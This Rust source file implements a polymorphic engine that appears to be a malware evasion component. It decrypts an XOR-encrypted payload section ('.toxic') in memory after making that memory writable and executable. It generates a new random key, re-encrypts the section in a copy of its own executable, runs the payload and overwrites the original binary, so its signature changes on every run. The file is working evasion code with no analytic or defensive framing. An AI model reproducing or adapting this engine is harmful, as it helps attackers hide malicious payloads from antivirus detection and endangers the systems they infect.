use std::{env, fs};
use std::path::PathBuf;
use libc::{_SC_PAGESIZE, c_int, c_void, mprotect, PROT_EXEC, PROT_READ, PROT_WRITE, sysconf};
use object::{File, Object, ObjectSection};
use rand::{RngCore, thread_rng};
use crate::toxic::XOR_KEY;

pub struct PolymorphicEngine {
    exe_path: PathBuf,
    tmp_path: PathBuf,
    tmp_data: Vec<u8>,
}

impl PolymorphicEngine {
    pub fn new() -> PolymorphicEngine {
        let exe_path = env::current_exe().unwrap();
        let tmp_path = exe_path.with_extension("tmp");

        fs::copy(&exe_path, &tmp_path).unwrap();

        let tmp_data = fs::read(&tmp_path).unwrap();

        PolymorphicEngine {
            exe_path,
            tmp_path,
            tmp_data,
        }
    }

    pub fn run(&mut self, payload: fn()) {
        let tmp_data_cpy = self.tmp_data.clone();
        let tmp_file = File::parse(tmp_data_cpy.as_slice()).unwrap();

        let section_toxic = tmp_file.section_by_name(".toxic").unwrap();

        self.set_protections_to_memory_region(
            payload as usize,
            section_toxic.size() as usize,
            PROT_READ | PROT_EXEC | PROT_WRITE,
        );

        self.decrypt_memory_region(
            payload as usize,
            section_toxic.size() as usize,
        );

        self.decrypt_binary_region(
            section_toxic.file_range().unwrap().0 as usize,
            section_toxic.size() as usize,
        );

        self.set_protections_to_memory_region(
            payload as usize,
            section_toxic.size() as usize,
            PROT_READ | PROT_EXEC,
        );

        let section_key = tmp_file.section_by_name(".key").unwrap();

        self.randomize_binary_region(
            section_key.file_range().unwrap().0 as usize,
            section_key.size() as usize,
        );

        self.encrypt_binary_region(
            section_toxic.file_range().unwrap().0 as usize,
            section_toxic.size() as usize,
        );

        payload();
        self.save_changes()
    }

    fn set_protections_to_memory_region(&self, region_start: usize, region_size: usize, protections: c_int) {
        let region_end = region_start + region_size;

        unsafe {
            let page_size = sysconf(_SC_PAGESIZE);
            let page_start = region_start & -page_size as usize;
            let len = region_end - page_start;

            let _res = mprotect(page_start as *mut c_void, len, protections);
        }
    }

    fn decrypt_memory_region(&self, region_start: usize, region_size: usize) {
        let region_start_pointer = region_start as *mut u8;

        unsafe {
            for i in 0..region_size {
                *(region_start_pointer).offset(i as isize) ^= XOR_KEY[i];
            }
        }
    }

    fn decrypt_binary_region(&mut self, region_start: usize, region_size: usize) {
        unsafe {
            for i in 0..region_size {
                self.tmp_data[region_start + i] ^= XOR_KEY[i];
            }
        }
    }

    fn randomize_binary_region(&mut self, region_start: usize, region_size: usize) {
        let mut rng = thread_rng();

        unsafe {
            rng.fill_bytes(&mut XOR_KEY);

            for i in 0..region_size {
                self.tmp_data[region_start + i] = XOR_KEY[i];
            }
        }
    }

    fn encrypt_binary_region(&mut self, region_start: usize, region_size: usize) {
        unsafe {
            for i in 0..region_size {
                self.tmp_data[region_start + i] ^= XOR_KEY[i];
            }
        }
    }

    fn save_changes(&self) {
        let exe_permissions = fs::metadata(&self.exe_path).unwrap().permissions();

        fs::write(&self.tmp_path, &self.tmp_data).unwrap();
        fs::set_permissions(&self.tmp_path, exe_permissions).unwrap();
        fs::rename(&self.tmp_path, &self.exe_path).unwrap()
    }
}